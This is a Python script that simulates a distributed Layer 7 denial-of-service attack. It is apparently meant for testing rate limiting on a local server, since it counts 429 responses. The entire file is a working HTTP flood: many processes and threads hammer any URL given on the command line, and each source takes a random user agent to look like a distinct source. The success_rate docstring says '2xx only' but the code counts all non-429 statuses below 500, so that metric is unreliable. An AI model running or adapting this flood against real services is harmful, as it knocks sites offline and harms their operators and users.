"""
Distributed DoS Simulation (Layer 7)
Launches multiple independent attacker processes, each with its own
connection pool, simulating traffic from N distinct sources.
Each process runs the HTTP flood independently and results are aggregated.
"""

import multiprocessing
import time
import requests
import random
from dataclasses import dataclass, field
from typing import List


@dataclass
class DDoSResult:
    total_requests: int = 0
    total_successes: int = 0
    total_rate_limited: int = 0
    total_failures: int = 0
    all_latencies: List[float] = field(default_factory=list)
    num_sources: int = 0
    start_time: float = 0.0
    end_time: float = 0.0

    @property
    def success_rate(self) -> float:
        """Percentage of requests actually served (2xx only)."""
        return self.total_successes / self.total_requests * 100 if self.total_requests > 0 else 0.0

    @property
    def block_rate(self) -> float:
        return self.total_rate_limited / self.total_requests * 100 if self.total_requests > 0 else 0.0

    @property
    def avg_latency(self) -> float:
        return sum(self.all_latencies) / len(self.all_latencies) if self.all_latencies else 0.0

    @property
    def p95_latency(self) -> float:
        if not self.all_latencies:
            return 0.0
        sorted_lat = sorted(self.all_latencies)
        return sorted_lat[int(len(sorted_lat) * 0.95)]

    @property
    def requests_per_second(self) -> float:
        duration = self.end_time - self.start_time
        return self.total_requests / duration if duration > 0 else 0.0


# Each worker process writes results into a multiprocessing Queue
def _source_worker(target_url: str, threads_per_source: int, duration: float, queue: multiprocessing.Queue):
    import threading

    successes = 0
    rate_limited = 0
    failures = 0
    latencies = []
    lock = threading.Lock()
    stop = threading.Event()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "curl/7.88.1",
        "python-requests/2.31.0",
    ]
    ua = random.choice(user_agents)

    def worker():
        nonlocal successes, rate_limited, failures
        session = requests.Session()
        session.headers.update({"User-Agent": ua})
        while not stop.is_set():
            try:
                t0 = time.perf_counter()
                resp = session.get(target_url, timeout=5)
                latency = time.perf_counter() - t0
                with lock:
                    if resp.status_code == 429:
                        rate_limited += 1
                    elif resp.status_code < 500:
                        successes += 1
                    else:
                        failures += 1
                    latencies.append(latency)
            except Exception:
                with lock:
                    failures += 1

    t_list = [threading.Thread(target=worker, daemon=True) for _ in range(threads_per_source)]
    for t in t_list:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in t_list:
        t.join(timeout=2)

    queue.put({"successes": successes, "rate_limited": rate_limited, "failures": failures, "latencies": latencies})


def run(
    target_url: str,
    num_sources: int = 10,
    threads_per_source: int = 20,
    duration: float = 30.0,
) -> DDoSResult:
    result = DDoSResult(num_sources=num_sources)
    queue: multiprocessing.Queue = multiprocessing.Queue()

    processes = [
        multiprocessing.Process(
            target=_source_worker,
            args=(target_url, threads_per_source, duration, queue),
            daemon=True,
        )
        for _ in range(num_sources)
    ]

    result.start_time = time.time()
    for p in processes:
        p.start()

    for p in processes:
        p.join(timeout=duration + 5)

    result.end_time = time.time()

    # Collect results from all sources
    while not queue.empty():
        data = queue.get_nowait()
        result.total_successes += data["successes"]
        result.total_rate_limited += data["rate_limited"]
        result.total_failures += data["failures"]
        result.all_latencies.extend(data["latencies"])

    result.total_requests = result.total_successes + result.total_rate_limited + result.total_failures
    return result


if __name__ == "__main__":
    import sys

    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000/"
    sources = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    dur = float(sys.argv[4]) if len(sys.argv) > 4 else 15.0

    print(f"DDoS Simulation → {url}  sources={sources}  threads/source={threads}  duration={dur}s")
    r = run(url, sources, threads, dur)
    print(f"  Total requests : {r.total_requests}")
    print(f"  Success rate   : {r.success_rate:.1f}%")
    print(f"  Req/s          : {r.requests_per_second:.1f}")
    print(f"  Avg latency    : {r.avg_latency*1000:.1f} ms")
    print(f"  P95 latency    : {r.p95_latency*1000:.1f} ms")
